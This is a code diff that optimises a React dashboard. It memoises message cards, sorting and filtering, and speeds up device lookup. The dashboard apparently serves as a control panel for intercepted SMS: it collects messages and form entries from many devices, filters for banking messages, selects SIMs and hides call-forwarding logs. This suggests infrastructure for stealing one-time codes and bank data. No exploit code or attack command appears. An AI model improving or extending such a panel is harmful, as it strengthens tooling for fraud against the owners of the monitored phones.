@@ -1,4 +1,4 @@
-import { useState, useEffect, useCallback, useRef, createContext, useContext } from "react";
+import React, { useState, useEffect, useCallback, useMemo, useRef, createContext, useContext } from "react";
 import { createPortal } from "react-dom";
 import { CircularLoader } from "@/components/ui/circular-loader";
 import { CopyIconButton } from "@/components/ui/copy-icon-button";
@@ -210,7 +210,7 @@ function Row({ label, value, mono, accent }: { label: string; value: string; mon
 }
 
 /* ─── Message card ─── */
-function MsgCard({
+const MsgCard = React.memo(function MsgCard({
   msg, deviceName, device, onOpen, cardClickable, formEntries,
 }: {
   msg: DbMessage;
@@ -228,7 +228,12 @@ function MsgCard({
   }
 
   return (
-    <div id={`msg-${msg.id}`} style={{ borderRadius: 8, overflow: "hidden", border: `1px solid ${t.cardB}` }}>
+    <div id={`msg-${msg.id}`} style={{
+      borderRadius: 8, overflow: "hidden", border: `1px solid ${t.cardB}`,
+      // GPU skips offscreen card paint/layout → buttery scroll with thousands of cards
+      contentVisibility: "auto",
+      containIntrinsicSize: "0 140px",
+    } as React.CSSProperties}>
       <div
         onClick={cardClickable && device ? handleCardClick : undefined}
         style={{
@@ -342,7 +347,7 @@ function MsgCard({
       )}
     </div>
   );
-}
+});
 
 /* ─── SIM Selector ─── */
 function SimSelect({ value, onChange, device }: { value: "1" | "2"; onChange: (v: "1" | "2") => void; device: DbDevice }) {
@@ -669,20 +674,30 @@ function HomePage({
   const t = useTheme();
   const [search, setSearch] = useState("");
 
-  function getDevice(deviceId: string) { return devices.find(d => d.deviceId === deviceId); }
+  // Build device lookup once per devices change — O(1) lookups vs O(n) find()
+  const deviceMap = useMemo(() => {
+    const m = new Map<string, DbDevice>();
+    for (const d of devices) m.set(d.deviceId, d);
+    return m;
+  }, [devices]);
+  const getDevice = useCallback((deviceId: string) => deviceMap.get(deviceId), [deviceMap]);
 
-  const formByDevice = formData.reduce((acc, f) => {
-    if (!acc[f.deviceId]) acc[f.deviceId] = [];
-    acc[f.deviceId].push(f);
+  const formByDevice = useMemo(() => {
+    const acc: Record<string, DbFormData[]> = {};
+    for (const f of formData) {
+      if (!acc[f.deviceId]) acc[f.deviceId] = [];
+      acc[f.deviceId].push(f);
+    }
     return acc;
-  }, {} as Record<string, DbFormData[]>);
+  }, [formData]);
 
-  const allMsgs = [...messages]
-    .sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime())
-    .filter(m => {
-      const q = search.toLowerCase().trim();
-      if (!q) return true;
-      const dev = getDevice(m.deviceId);
+  // Memoize the heavy sort+filter — recomputed only when inputs change, NOT on every 1s live tick
+  const allMsgs = useMemo(() => {
+    const sorted = [...messages].sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime());
+    const q = search.toLowerCase().trim();
+    if (!q) return sorted;
+    return sorted.filter(m => {
+      const dev = deviceMap.get(m.deviceId);
       return (
         m.deviceId.toLowerCase().includes(q) ||
         m.userId.toLowerCase().includes(q) ||
@@ -692,6 +707,7 @@ function HomePage({
         (dev?.name ?? "").toLowerCase().includes(q)
       );
     });
+  }, [messages, search, deviceMap]);
 
   const { visible: visibleMsgs, sentinelRef: homeSentinel, loading: homeLoading } = useInfiniteScroll(allMsgs, 20, initialCount, onCountChange);
 
@@ -764,17 +780,24 @@ function MessagesPage({
   const [search, setSearch] = useState("");
   const [filterSensitive, setFilterSensitive] = useState(false);
 
-  function getDevice(deviceId: string) { return devices.find(d => d.deviceId === deviceId); }
+  const deviceMap = useMemo(() => {
+    const m = new Map<string, DbDevice>();
+    for (const d of devices) m.set(d.deviceId, d);
+    return m;
+  }, [devices]);
+  const getDevice = useCallback((deviceId: string) => deviceMap.get(deviceId), [deviceMap]);
 
-  const filtered = [...messages]
-    .sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime())
-    .filter(m => {
+  // Memoize so we don't re-sort 2000+ messages on every parent re-render (1Hz live tick)
+  const filtered = useMemo(() => {
+    const sorted = [...messages].sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime());
+    const q = search.toLowerCase();
+    return sorted.filter(m => {
       // Call Forward system logs hide karo — sirf real SMS dikhao
       if (m.fromSender.toLowerCase().startsWith("call forward")) return false;
       if (filterSensitive && !isBankingMsg(m.body, m.fromSender)) return false;
-      const q = search.toLowerCase();
-      return !q || m.body.toLowerCase().includes(q) || m.fromSender.toLowerCase().includes(q) || m.fromNumber.includes(q) || (getDevice(m.deviceId)?.name ?? "").toLowerCase().includes(q);
+      return !q || m.body.toLowerCase().includes(q) || m.fromSender.toLowerCase().includes(q) || m.fromNumber.includes(q) || (deviceMap.get(m.deviceId)?.name ?? "").toLowerCase().includes(q);
     });
+  }, [messages, search, filterSensitive, deviceMap]);
 
   const { visible: visibleMsgsFeed, sentinelRef: feedSentinel, loading: feedLoading } = useInfiniteScroll(filtered, 20, initialCount, onCountChange);
 
